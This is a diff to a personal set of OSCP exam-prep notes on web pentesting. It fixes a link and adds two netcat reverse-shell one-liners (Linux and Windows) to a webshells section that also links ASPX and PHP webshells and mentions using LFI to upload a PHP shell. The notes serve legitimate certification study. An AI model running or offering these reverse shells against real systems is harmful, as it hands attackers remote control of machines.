@@ -26,7 +26,7 @@ description: Just some rough notes in preparation for the OSCP.
 * If a WebDav directory is discovered during enumeration then it should be noted that an LFI vulnerability could be used to obtain the password and upload a PHP shell. The following is an example of a Webdav password location:
   * `/var/www/html/webdav/passwd.dav`
   * [HackTricks has a great guide](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav) on uploading a shell with Curl or other methods of exploitation.
-* When testing[ Remote File Inclusion](../../web-application/remote-file-inclusion-rfi.md) keep in mind that the port being tested matters.&#x20;
+* When testing[ Remote File Inclusion](../web-application/remote-file-inclusion-rfi.md) keep in mind that the port being tested matters.&#x20;
   * Use a common port such as 80 or 443 on your Python3 server when testing.
 
 ### SQL Injection (SQLi)
@@ -128,6 +128,10 @@ These are the most consistent webshells that I have discovered throughout testin
 
 * [Aspnet](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx)&#x20;
 * [PHP](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
+
+`nc 10.10.10.1 4444 –e /bin/bash`
+
+`nc.exe 10.10.10.1 4444 –e cmd.exe`
 
 ### Shell Upgrades
 
